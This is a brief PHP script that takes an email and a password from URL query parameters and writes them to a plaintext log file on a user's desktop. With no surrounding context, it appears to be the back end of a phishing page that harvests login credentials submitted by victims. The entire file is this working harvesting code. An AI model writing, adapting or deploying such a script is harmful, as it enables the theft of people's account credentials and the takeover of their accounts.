<?php


$myfile = fopen("/home/eilon26/Desktop/log.txt", "w") or die("Unable to open file!");
$txt = "username: ".$_GET['email']." | password: ".$_GET['pass'];

fwrite($myfile, $txt);

fclose($myfile);
?>
